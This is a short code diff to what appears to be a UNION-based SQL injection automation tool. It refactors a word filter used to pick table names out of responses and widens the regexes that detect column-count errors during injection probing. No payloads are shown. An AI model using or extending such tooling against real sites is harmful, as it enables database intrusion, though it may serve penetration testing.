@@ -52,6 +52,16 @@ class DBMSType(Enum):
     UNKNOWN = "unknown"
 
 
+# Common English/HTML words to filter out from SQL results
+COMMON_FILTER_WORDS = {
+    'the', 'and', 'for', 'are', 'but', 'not', 'you', 'all',
+    'can', 'her', 'was', 'one', 'our', 'out', 'div', 'span',
+    'class', 'name', 'type', 'text', 'href', 'src', 'alt', 'with',
+    'this', 'that', 'from', 'have', 'has', 'will', 'more', 'when',
+    'into', 'than', 'some', 'time', 'very', 'just', 'know', 'take',
+}
+
+
 class UnionSQLInjectionAttacker:
     """
     Advanced UNION-based SQL injection attack automation.
@@ -563,7 +573,8 @@ class UnionSQLInjectionAttacker:
             r'valid MySQL result',
             r'PostgreSQL.*ERROR',
             r'division by zero',
-            r'used when column count does not match',
+            r'column count.*does not match',
+            r'column count.*mismatch',
         ]
         
         for pattern in error_patterns:
@@ -691,13 +702,9 @@ class UnionSQLInjectionAttacker:
         table_pattern = r'\b[a-z_][a-z0-9_]{2,30}\b'
         matches = re.findall(table_pattern, response_body, re.IGNORECASE)
         
-        # Filter out common HTML/English words
-        common_words = {'the', 'and', 'for', 'are', 'but', 'not', 'you', 'all', 
-                       'can', 'her', 'was', 'one', 'our', 'out', 'div', 'span',
-                       'class', 'name', 'type', 'text', 'href', 'src', 'alt'}
-        
+        # Filter out common HTML/English words using module-level constant
         for match in matches:
-            if match.lower() not in common_words and len(match) > 2:
+            if match.lower() not in COMMON_FILTER_WORDS and len(match) > 2:
                 if match not in results:
                     results.append(match)
         
